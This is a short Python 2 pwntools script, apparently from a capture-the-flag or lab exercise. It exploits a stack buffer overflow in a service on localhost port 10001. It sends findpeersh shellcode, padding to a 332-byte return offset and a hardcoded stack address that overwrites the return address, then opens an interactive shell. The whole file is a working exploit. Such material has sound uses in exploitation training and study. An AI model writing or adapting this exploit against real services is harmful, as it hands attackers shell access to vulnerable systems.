#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux")

SHELLCODE = asm(shellcraft.findpeersh())
RET_OFFSET = 332 #Found by sending cyclic data
START_OF_BUFFER = 0xffffd580 #ECX pointed there when we crashed the process with cyclic data
                             #Your process is probably mapped differently

r = remote('localhost', 10001)
r.send(flat(0xffffffff,
            SHELLCODE,   #This will be at address 'START_OF_BUFFER'
            'A' * (RET_OFFSET - len(SHELLCODE)), #Pad with 'A's until just before return address
            START_OF_BUFFER)) #Overwrite return address with address of shellcode
r.interactive()
